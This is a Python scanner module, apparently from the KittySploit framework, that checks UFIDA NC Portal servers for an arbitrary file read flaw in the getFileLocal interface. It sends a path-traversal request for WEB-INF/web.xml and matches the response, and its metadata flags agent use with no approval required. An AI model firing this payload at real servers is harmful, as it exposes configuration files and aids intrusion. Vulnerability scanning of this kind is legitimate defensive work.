#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is any file reading in the getFileLocal interface of UFIDA Mobile System Management."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'UFIDA NC Portal - Arbitrary File Read Detection',
        'description': 'There is any file reading in the getFileLocal interface of UFIDA Mobile System Management.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'yonyou', 'ufida', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8B%E7%A7%BB%E5%8A%A8%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86getFileLocal%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        server = r.headers.get("Server") or r.headers.get("server") or ""
        body_all = ('nc.bs.framework.server.WebApplicationStartupHook', '<web-app',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="UFIDA NC Portal - Arbitrary File Read detected",
                path='/portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml',
            )
            return True
        return False

